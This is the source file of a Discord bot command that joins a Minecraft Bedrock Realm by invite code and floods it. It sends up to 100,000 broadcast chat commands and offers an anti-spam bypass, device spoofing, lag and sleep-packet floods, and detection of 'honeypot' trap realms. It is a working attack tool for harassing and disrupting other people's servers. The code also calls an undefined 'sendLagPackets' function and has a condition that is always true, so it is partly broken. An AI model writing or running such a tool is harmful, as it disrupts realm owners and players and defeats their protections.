const fs = require('fs');
const path = require('path');
const { Authflow } = require('prismarine-auth');
const { RealmAPI } = require('prismarine-realms');
const { SlashCommandBuilder } = require('@discordjs/builders');
const bedrock = require('bedrock-protocol');
const { EmbedBuilder, WebhookClient } = require('discord.js');

const adminFilePath = path.join(__dirname, '..', '..', 'data', 'admin.json');
const blacklistPath = path.join(__dirname, '..', '..', 'data', 'blacklist.json');
const honeypotPath = path.join(__dirname, '..', '..', 'data', 'honeypot.json');
const webhookLoggingClient = new WebhookClient({ url: '' });

const trollEmojie = "<:HDtroll:1246615956176769024>"; // replace them whit your emojies
const loadingemoji = "<a:loading:1256535355138768906>";
const workedEmojie = "<a:Check:1256612972793565204>";
const errorEmojie = "<:deny:1256622572762562681>";
const lEmoji = '<a:DyingLaughing:1244399086061355090>';
const one = '<:reply:1258168210486726726>';
const second = '<:replycountinue:1258168190861709484>';

const deviceOptions = {
    'Unknown': 0,
    'Android': 1,
    'iOS': 2,
    'OSX': 3,
    'FireOS': 4,
    'GearVR': 5,
    'Hololens': 6,
    'Windows 10 (x64)': 7,
    'Windows 10 (x86)': 8,
    'Dedicated Server': 9,
    'TvOS': 10,
    'Orbis': 11,
    'Nintendo Switch': 12,
    'Xbox': 13,
    'Windows Phone': 14,
    'Linux': 15
};

let blacklistedUsers = new Set();
let honeypotRealms = new Set();
let adminUsers = new Set();

async function loadBlacklist() {
    try {
        const blacklistData = await fs.promises.readFile(blacklistPath, 'utf-8');
        blacklistedUsers = new Set(JSON.parse(blacklistData));
    } catch (error) {
        console.error('Error loading blacklist:', error);
    }
}

async function loadHoneypot() {
    try {
        const honeypotData = await fs.promises.readFile(honeypotPath, 'utf-8');
        honeypotRealms = new Set(JSON.parse(honeypotData));
    } catch (error) {
        console.error('Error loading honeypot file:', error);
    }
}

async function loadAdmins() {
    try {
        const adminData = await fs.promises.readFile(adminFilePath, 'utf-8');
        adminUsers = new Set(JSON.parse(adminData));
    } catch (error) {
        console.error('Error loading admin file:', error);
    }
}

loadBlacklist();
loadHoneypot();
loadAdmins();

function parseKickMessage(message) {
    return message;
}

module.exports = {
    command: new SlashCommandBuilder()
        .setName('spam')
        .setDescription('Spams realm with a message')
        .addIntegerOption(option =>
            option.setName('spamtype')
                .setDescription('Type of spam command')
                .setRequired(true)
                .addChoices(
                    { name: '/me  | external', value: 1 },
                    { name: '/tell| external', value: 2 },
                    { name: '/msg | external', value: 4 }
                )
        )
        .addStringOption(option =>
            option.setName('realmcode')
                .setDescription('Realm Code To Spam')
                .setRequired(true)
                .setMinLength(11)
                .setMaxLength(11)
        )
        .addStringOption(option =>
            option.setName('custommessage')
                .setDescription('Custom message to spam')
                .setRequired(true)
        )
        .addStringOption(option =>
            option.setName('device_os')
                .setDescription('The device to spoof as')
                .setRequired(true)
                .addChoices(
                    { name: 'Unknown', value: 'Unknown' },
                    { name: 'Android', value: 'Android' },
                    { name: 'Samsung Smart fridge', value: 'Android' },
                    { name: 'iOS', value: 'iOS' },
                    { name: 'Ocean Gate', value: 'OSX' },
                    { name: 'OSX (macOS)', value: 'OSX' },
                    { name: 'FireOS', value: 'FireOS' },
                    { name: 'GearVR', value: 'GearVR' },
                    { name: 'Hololens', value: 'Hololens' },
                    { name: 'Windows 10 (x64)', value: 'Windows 10 (x64)' },
                    { name: 'Windows 10 (x86)', value: 'Windows 10 (x86)' },
                    { name: 'Dedicated Server', value: 'Dedicated Server' },
                    { name: 'TvOS', value: 'TvOS' },
                    { name: 'Orbis', value: 'Orbis' },
                    { name: 'Nintendo Switch', value: 'Nintendo Switch' },
                    { name: 'Xbox', value: 'Xbox' },
                    { name: 'Windows Phone', value: 'Windows Phone' },
                    { name: 'Linux', value: 'Linux' }
                )
        )
        .addIntegerOption(option =>
            option.setName('packets')
                .setDescription('Number of packets to send')
                .setRequired(true)
                .addChoices(
                    { name: '10K', value: 10000 },
                    { name: '50K', value: 50000 },
                    { name: '100K', value: 100000 }
                )
        )
        .addBooleanOption(option =>
            option.setName('rainbow')
                .setDescription('Rainbow text option')
                .setRequired(false)
        )
        .addBooleanOption(option =>
            option.setName('bypass')
                .setDescription('Anti-spam bypass option')
                .setRequired(false)
        )
        .addBooleanOption(option =>
            option.setName('lag')
                .setDescription('Send lag packets')
                .setRequired(false)
        )
        .addBooleanOption(option =>
            option.setName('sleep')
                .setDescription('Send sleep packets')
                .setRequired(false)
        ),

    callback: async (interaction) => {
        try {
            await interaction.deferReply({ ephemeral: false });

            const userId = interaction.user.id;
            const userTag = interaction.user.tag;
            const realmCode = interaction.options.getString('realmcode');
            const customMessage = interaction.options.getString('custommessage');
            const deviceOS = interaction.options.getString('device_os');
            const packetCount = interaction.options.getInteger('packets');
            const spamType = interaction.options.getInteger('spamtype');
            const rainbow = interaction.options.getBoolean('rainbow') || false;
            const bypass = interaction.options.getBoolean('bypass') || false;
            const sendLag = interaction.options.getBoolean('lag') || false;
            const sendSleep = interaction.options.getBoolean('sleep') || false;

            if (!adminUsers.has(userId)) {
                const embed = new EmbedBuilder()
                    .setColor('#ff0000')
                    .setTitle('Access Denied')
                    .setDescription(`${errorEmojie} You do not have permission to use this command.`);
                return interaction.editReply({ embeds: [embed], ephemeral: false });
            }

            if (!customMessage || customMessage.trim() === '') {
                const errorEmbed = new EmbedBuilder()
                    .setColor('#ff0000')
                    .setTitle('Error')
                    .setDescription('Custom message is undefined or empty.');
                return interaction.editReply({ embeds: [errorEmbed] });
            }

            const initialEmbed = new EmbedBuilder()
                .setTitle(`${trollEmojie} Spamming ${realmCode} ${trollEmojie}`)
                .setDescription(`${second}Spamming ${realmCode} \n${second}Sending ${packetCount} Packets \n${second}Spam Message: ${customMessage}`)
                .addFields(
                    { name: 'Device', value: deviceOS, inline: true },
                    { name: 'Connected', value: loadingemoji, inline: false },
                    { name: 'Spammed', value: loadingemoji, inline: false },
                    { name: 'Lag Packets', value: sendLag ? loadingemoji : 'Not selected', inline: false },
                    { name: 'Sleep Packets', value: sendSleep ? loadingemoji : 'Not selected', inline: false },
                    { name: 'Disconnected', value: loadingemoji, inline: false }
                )
                .setFooter({ text: `This command will be sent to our logging channel!` })
                .setTimestamp();

            await interaction.editReply({ embeds: [initialEmbed] });

            if (blacklistedUsers.has(userId)) {
                const embed = new EmbedBuilder()
                    .setColor('#ff0000')
                    .setTitle('Womp Womp')
                    .setDescription(`${lEmoji} You are Blacklisted ${lEmoji}`);
                await interaction.editReply({ embeds: [embed], ephemeral: false });

                const webhookEmbed = new EmbedBuilder()
                    .setTitle('Blacklist Check')
                    .setDescription(`User \`${userTag}\` attempted to use the \`/spam\` command but is blacklisted.`)
                    .setColor('#ff0000')
                    .addFields(
                        { name: 'Realm Code', value: realmCode },
                        { name: 'Message', value: customMessage },
                        { name: 'Device', value: deviceOS }
                    )
                    .setTimestamp();

                await webhookLoggingClient.send({ embeds: [webhookEmbed] });
                return;
            }

            const realmData = await checkCodes([realmCode]);
            if (realmData[0].playerCount === 0 || (realmData[0].status === 'error' && realmData[0].error.includes('503'))) {
                honeypotRealms.add(realmCode);
                await fs.promises.writeFile(honeypotPath, JSON.stringify([...honeypotRealms], null, 2));

                const honeypotEmbed = new EmbedBuilder()
                    .setColor('#ff0000')
                    .setTitle('Honeypot Detected')
                    .setDescription(`${errorEmojie}This realm is a honeypot and cannot be joined${errorEmojie}`);
                await interaction.editReply({ embeds: [honeypotEmbed], ephemeral: false });

                const webhookHoneypotEmbed = new EmbedBuilder()
                    .setTitle('Honeypot Detected')
                    .setDescription(`User \`${userTag}\` attempted to join a honeypot realm.`)
                    .setColor('#ff0000')
                    .addFields(
                        { name: 'Realm Code', value: realmCode },
                        { name: 'Message', value: customMessage },
                        { name: 'Device', value: deviceOS }
                    )
                    .setTimestamp();

                await webhookLoggingClient.send({ embeds: [webhookHoneypotEmbed] });
                return;
            }

            const authFlow = new Authflow('unique_identifier', './');
            const bedrockClient = bedrock.createClient({
                authFlow: authFlow,
                deviceOS: deviceOptions[deviceOS],
                realms: {
                    realmInvite: `https://realms.gg/${realmCode}`
                }
            });

            bedrockClient.on('start_game', async (packet) => {
                initialEmbed.spliceFields(1, 1, { name: 'Connected', value: workedEmojie, inline: false });
                await interaction.editReply({ embeds: [initialEmbed] });

                let messageCount = 0;
                const interval = setInterval(() => {
                    if (messageCount >= packetCount) {
                        clearInterval(interval);
                        return;
                    }

                    if (sendLag) {
                        sendLagPackets(bedrockClient, packet);
                    }

                    for (let i = 0; i < 50000 && messageCount < packetCount; i++) {
                        let message = customMessage + (bypass ? ` ${generateRandomString(8)}` : ' 0');
                        let command;
                        if (rainbow) {
                            switch (spamType) {
                                case 1:
                                    command = `/me ${colorizeText(message, true)}`;
                                    break;
                                case 2:
                                    command = `/tell @a ${colorizeText(message, true)}`;
                                    break;
                                case 4:
                                    command = `/msg @a ${colorizeText(message, true)}`;
                                    break;
                                default:
                                    console.error('Invalid spam type');
                            }
                        } else {
                            switch (spamType) {
                                case 1:
                                    command = `/me ${message}`;
                                    break;
                                case 2:
                                    command = `/tell @a ${message}`;
                                    break;
                                case 4:
                                    command = `/msg @a ${message}`;
                                    break;
                                default:
                                    console.error('Invalid spam type');
                            }
                        }
                        if (spamType !== 3 && command) {
                            bedrockClient.queue('command_request', {
                                command: command,
                                internal: false,
                                version: 66,
                                origin: {
                                    type: 5,
                                    uuid: "",
                                    request_id: ""
                                }
                            });
                        }
                        messageCount += 1;
                    }

                    if (sendSleep) {
                        sendSleepSpam(bedrockClient, packet);
                    }

                }, 50);

                initialEmbed.spliceFields(2, 1, { name: 'Spammed', value: workedEmojie, inline: false });
                await interaction.editReply({ embeds: [initialEmbed] });

                if (sendLag) {
                    initialEmbed.spliceFields(3, 1, { name: 'Lag Packets', value: workedEmojie, inline: false });
                    await interaction.editReply({ embeds: [initialEmbed] });
                }

                if (sendSleep) {
                    initialEmbed.spliceFields(4, 1, { name: 'Sleep Packets', value: workedEmojie, inline: false });
                    await interaction.editReply({ embeds: [initialEmbed] });
                }

                // Continuously send lag packets while connected
                if (sendSleepSpam) {
                    const lagInterval = setInterval(() => {
                        sendLagPackets(bedrockClient, packet);
                    }, 340);
                    
                    bedrockClient.on('disconnect', () => {
                        clearInterval(lagInterval);
                    });

                    bedrockClient.on('error', () => {
                        clearInterval(lagInterval);
                    });
                } 

                    /*  if (sendLag) {
                    const lagInterval = setInterval(() => {
                        sendLagPackets(bedrockClient, packet);
                    }, 340);
                    
                    bedrockClient.on('disconnect', () => {
                        clearInterval(lagInterval);
                    });

                    bedrockClient.on('error', () => {
                        clearInterval(lagInterval);
                    });
                } */

                setTimeout(() => {
                    bedrockClient.disconnect();
                    initialEmbed.spliceFields(5, 1, { name: 'Disconnected', value: workedEmojie, inline: false });
                    interaction.editReply({ embeds: [initialEmbed] });
                    console.log(`Disconnected from ${realmCode}`);

                    const webhookEmbed = new EmbedBuilder()
                        .setTitle('Realm Spammed')
                        .setDescription(`User ${interaction.user.tag} used the \`/spam\` command.`)
                        .setColor('Green')
                        .addFields(
                            { name: 'Realm Code', value: realmCode },
                            { name: 'Spam type', value: spamType.toString() },
                            { name: 'Message', value: customMessage },
                            { name: 'Device', value: deviceOS }
                        )
                        .setTimestamp();

                    webhookLoggingClient.send({ embeds: [webhookEmbed] });
                }, 3000);
            });

            bedrockClient.on('disconnect', async (packet) => {
                if (packet.reason === 'disconnectionScreen.serverFull') {
                    initialEmbed.setColor('#ff0000').addFields({ name: errorEmojie, value: 'Server is full.', inline: false });
                    await interaction.editReply({ embeds: [initialEmbed] });
                    bedrockClient.disconnect();  // Stop further operations
                }
            });

            bedrockClient.on('kick', async (reason) => {
                initialEmbed.setColor('#ff0000').addFields({ name: errorEmojie, value: parseKickMessage(reason.message), inline: false });
                await interaction.editReply({ embeds: [initialEmbed] });
                bedrockClient.disconnect();  // Stop further operations
            });

            bedrockClient.on('error', async (err) => {
                initialEmbed.setColor('#ff0000').addFields({ name: errorEmojie, value: err.message, inline: false });
                await interaction.editReply({ embeds: [initialEmbed] });
                bedrockClient.disconnect();  // Stop further operations
            });

        } catch (error) {
            console.error('Unexpected error:', error);
            const errorEmbed = new EmbedBuilder()
                .setColor('#ff0000')
                .setTitle('Unexpected Error')
                .setDescription('An unexpected error occurred.')
                .addFields({ name: 'Error', value: error.message, inline: false });
            await interaction.editReply({ embeds: [errorEmbed] });
        }
    }
};

async function checkCodes(codes) {
    const profilesFolder = './';
    const options = {
        authTitle: '00000000441cc96b',
        flow: 'live'
    };

    const userIdentifier = 'unique_identifier';
    const authFlow = new Authflow(userIdentifier, profilesFolder, options);
    const api = RealmAPI.from(authFlow, 'bedrock');

    const checkPromises = codes.map(async (code) => {
        try {
            const realm = await api.getRealmFromInvite(code);
            if (!realm) {
                return { code, status: 'invalid' };
            }

            const address = await realm.getAddress();
            const realmData = await api.getRealm(realm.id);
            const playerCount = realmData.players.length;

            return {
                code,
                status: 'valid',
                realmName: realm.name,
                realmId: realm.id,
                host: address.host,
                port: address.port,
                playerCount
            };
        } catch (error) {
            if (error.message.includes('403')) {
                console.error('User found in block list:', error);
                throw new Error('User found in block list');
            }
            console.error('Error fetching realm data:', error);
            return { code, status: 'error', error: error.message };
        }
    });

    try {
        return await Promise.all(checkPromises);
    } catch (error) {
        console.error('Error fetching data:', error);
        throw new Error('Error fetching data');
    }
}

function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function colorizeText(text) {
    const words = text.split(' ');
    const coloredWords = words.map(word => {
        const colorCode = randomCode();
        return `${colorCode}${word}`;
    });
    return coloredWords.join(' ');
}

function randomCode() {
    const optionsString = "1234567890";
    const optionsArray = optionsString.split('');
    const randomIndex = Math.floor(Math.random() * optionsArray.length);
    const randomOption = optionsArray[randomIndex];
    return "§" + randomOption;
}

function sendSleepSpam(client, packet) {
    const action_packet = {
        runtime_entity_id: packet.runtime_entity_id,
        position: { x: 0, y: 0, z: 0 },
        result_position: { x: 0, y: 0, z: 0 },
        face: 0
    };

    client.write("player_action", {
        ...action_packet,
        action: "start_sleeping"
    });

    client.write("player_action", {
        ...action_packet,
        action: "stop_sleeping"
    });
}


